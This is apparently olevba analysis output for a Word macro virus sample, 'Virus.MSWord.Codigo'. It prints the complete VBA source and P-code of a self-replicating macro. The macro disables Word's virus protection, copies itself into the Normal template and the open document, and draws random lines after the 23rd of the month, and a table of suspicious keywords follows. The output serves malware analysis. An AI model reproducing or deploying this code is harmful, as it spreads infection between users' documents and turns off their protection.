olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Codigo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Codigo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Esta Infectado
Private Sub Document_Close()
On Error Resume Next

Dim i, x1, x2, y1, y2 As Integer
Dim Figura


Call Document_Open

Randomize
If Day(Now()) > 23 Then

  For i = 1 To 100
    x1 = Int(1000 * Rnd(1000))
    x2 = Int(1000 * Rnd(1000))
    y1 = Int(1000 * Rnd(1000))
    y2 = Int(1000 * Rnd(1000))
    Figura = ActiveDocument.Shapes.AddLine(x1, y1, x2, y2)
  Next i
End If

ActiveDocument.Save
NormalTemplate.Save

End Sub

Private Sub Document_Open()
On Error Resume Next

Dim ad, nt As Object
Dim MiCodigo As String
Dim DocInfectado As Boolean
Dim NormalInfectado As Boolean

Options.VirusProtection = False

'Inicializar Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

MiCodigo = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
If Len(MiCodigo) < 1 Then
   MiCodigo = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
End If

Dim EsteCogigo As String
    EsteCodigo = Mid(MiCodigo, 1, Len(MiCodigo))

nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
nt.CodeModule.AddFromString EsteCodigo

ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
ad.CodeModule.AddFromString EsteCodigo

NormalTemplate.Save
ActiveDocument.Save
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Codigo
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5125 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000E "Esta Infectado"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	Dim 
' 	VarDefn i
' 	VarDefn x1
' 	VarDefn x2
' 	VarDefn y1
' 	VarDefn y2 (As Integer)
' Line #5:
' 	Dim 
' 	VarDefn Figura
' Line #6:
' Line #7:
' Line #8:
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #9:
' Line #10:
' 	ArgsCall Read 0x0000 
' Line #11:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Gt 
' 	IfBlock 
' Line #12:
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #14:
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	ArgsLd Rnd 0x0001 
' 	Mul 
' 	FnInt 
' 	St x1 
' Line #15:
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	ArgsLd Rnd 0x0001 
' 	Mul 
' 	FnInt 
' 	St x2 
' Line #16:
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	ArgsLd Rnd 0x0001 
' 	Mul 
' 	FnInt 
' 	St y1 
' Line #17:
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	ArgsLd Rnd 0x0001 
' 	Mul 
' 	FnInt 
' 	St y2 
' Line #18:
' 	Ld x1 
' 	Ld y1 
' 	Ld x2 
' 	Ld y2 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddLine 0x0004 
' 	St Figura 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	EndIfBlock 
' Line #21:
' Line #22:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #23:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #24:
' Line #25:
' 	EndSub 
' Line #26:
' Line #27:
' 	FuncDefn (Private Sub Document_Open())
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' Line #30:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #31:
' 	Dim 
' 	VarDefn MiCodigo (As String)
' Line #32:
' 	Dim 
' 	VarDefn DocInfectado (As Boolean)
' Line #33:
' 	Dim 
' 	VarDefn NormalInfectado (As Boolean)
' Line #34:
' Line #35:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #36:
' Line #37:
' 	QuoteRem 0x0000 0x0015 "Inicializar Variables"
' Line #38:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #39:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #40:
' Line #41:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St MiCodigo 
' Line #42:
' 	Ld MiCodigo 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St MiCodigo 
' Line #44:
' 	EndIfBlock 
' Line #45:
' Line #46:
' 	Dim 
' 	VarDefn EsteCogigo (As String)
' Line #47:
' 	Ld MiCodigo 
' 	LitDI2 0x0001 
' 	Ld MiCodigo 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	St EsteCodigo 
' Line #48:
' Line #49:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	Ld EsteCodigo 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #51:
' Line #52:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #53:
' 	Ld EsteCodigo 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #54:
' Line #55:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #56:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

